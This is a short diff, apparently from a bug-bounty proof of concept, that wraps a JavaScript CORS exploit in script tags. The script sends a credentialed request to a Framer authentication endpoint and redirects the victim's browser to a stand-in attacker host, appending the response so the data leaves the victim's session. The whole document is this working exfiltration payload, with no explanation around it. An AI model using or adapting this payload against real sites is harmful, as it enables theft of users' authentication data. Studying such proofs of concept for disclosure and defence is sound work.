@@ -1,4 +1,5 @@
-var req = new XMLHttpRequest(); 
+<script>
+    var req = new XMLHttpRequest(); 
 req.onload = reqListener; 
 req.open('get','https://api.framer.com/auth/v2/signin/google',true); 
 req.withCredentials = true;
@@ -8,3 +9,4 @@ function reqListener() {
     location='//atttacker.net/log?key='+this.responseText; 
 };
 
+</script>
